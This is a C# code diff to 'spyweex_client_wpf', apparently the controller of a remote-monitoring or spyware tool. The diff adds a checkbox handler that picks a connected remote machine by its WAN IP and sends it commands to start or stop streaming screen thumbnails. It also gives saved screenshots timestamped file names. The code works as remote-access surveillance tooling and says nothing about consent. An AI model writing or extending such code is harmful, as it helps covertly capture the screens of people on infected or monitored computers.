@@ -8,6 +8,7 @@ using System.IO;
 using System.Linq;
 using System.Net;
 using System.Net.NetworkInformation;
+using System.Net.Sockets;
 using System.Text;
 using System.Threading;
 using System.Threading.Tasks;
@@ -319,7 +320,7 @@ namespace spyweex_client_wpf
             {
                 JpegBitmapEncoder encoder = new JpegBitmapEncoder();
                 Guid photoID = System.Guid.NewGuid();
-                String photolocation = "Saved_Thumbnail".ToString() + ".jpg";
+                String photolocation = "Saved_Thumbnail_" + DateTime.Now.ToString(CultureInfo.CurrentCulture).Replace(" ", "_").Replace(":", "-") + "_id_" + photoID.ToString() + ".jpg";
 
                 encoder.Frames.Add(ViewModelSession.SelectedSession.BiFrame);
                 using (var filestream = new FileStream(photolocation, FileMode.Create))
@@ -329,6 +330,37 @@ namespace spyweex_client_wpf
             catch (Exception ex)
             {
                 
+            }
+        }
+
+        private async void CheckBoxThumbnail_Click(object sender, RoutedEventArgs e)
+        {
+            WxhtpClient wxhtpClient;
+            try
+            {
+                IPEndPoint currentIpEndPoint = Utils.ParseIPEndpoint(((ViewModel)DataContext).SelectedSession.WANIP);
+                wxhtpClient = _wxhtpServiceServer.TryGetClientByIpEndpoint(currentIpEndPoint);
+            }
+            catch (Exception ex)
+            {
+                MessageBox.Show("No client selected. Select a client, or wait for a new connection from client.",
+                    "Error on checkbox Thumbnail clicked");
+                return;
+            }
+
+            if (CheckBoxThumbnail.IsChecked == true)
+            {
+                ct = cts.Token;
+                await wxhtpClient.ExecuteTask(
+                    ct, wxhtpClient.getTcpClient().Client.RemoteEndPoint.ToString(), METHOD_TYPE.GET, ACTION_TYPE.THUMBNAIL_SCREEN_START, PARAM_TYPES.number + "1");
+                wxhtpClient.ThumbnailListenerSubscribe();
+            }
+            else
+            {
+                ct = cts.Token;
+                await wxhtpClient.ExecuteTask(
+                    ct, wxhtpClient.getTcpClient().Client.RemoteEndPoint.ToString(), METHOD_TYPE.GET, ACTION_TYPE.THUMBNAIL_SCREEN_STOP, PARAM_TYPES.number + "1");
+
             }
         }
     }
